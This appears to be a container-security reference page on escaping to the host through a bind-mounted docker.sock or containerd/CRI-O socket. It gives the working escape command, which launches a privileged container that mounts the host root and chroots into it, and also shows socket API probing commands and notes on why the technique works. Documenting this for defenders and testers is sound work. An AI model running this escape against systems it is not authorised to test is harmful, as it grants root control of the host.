---
title: "Runtime socket mount: escaping through a bind-mounted engine socket"
description: "Escaping a container to the host through a container runtime control socket bind-mounted inside it (docker.sock, containerd.sock), which lets the container drive the engine to launch a new privileged, host-mounting container and take over the host."
keywords:
  - docker socket mount
  - docker.sock escape
  - containerd socket
  - runtime control socket
  - container escape
---

# Runtime socket mount

The container runtime's control socket is an unauthenticated root-equivalent API. When it is bind-mounted into a container (a common pattern for CI agents, monitoring, and "Docker-in-Docker"), the container can drive the engine on the host to create a brand-new container that is privileged and mounts the host root, which is a full escape even though the current container is unprivileged.

```bash
# Confirm the socket is present and writable
ls -l /var/run/docker.sock

# With a docker client: launch a container that owns the host, then chroot in
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host sh

# No client in the container? the socket is just an HTTP API
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head
```

containerd and CRI-O expose the same power through their own sockets, driven by `ctr`, `nerdctl`, or `crictl`:

```bash
ctr -a /run/containerd/containerd.sock containers list
crictl --runtime-endpoint unix:///run/crio/crio.sock ps
```

## Exploitation notes

- The new container does the escaping: it is created with `--privileged` and `-v /:/host`, so the socket itself needs no special flags on the container you start from.
- The engine runs as root on the host, so the spawned container's mounts and devices are the host's; this is why a mounted socket is root-equivalent regardless of the caller's privileges.
- Reaching the same daemon over the network rather than a mounted socket is covered under the runtime's own surface, for example Docker's [Exposed daemon API](../../runtimes/docker/exposed-daemon-api/index.md).

## References

- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Docker Engine API](https://docs.docker.com/engine/api/)
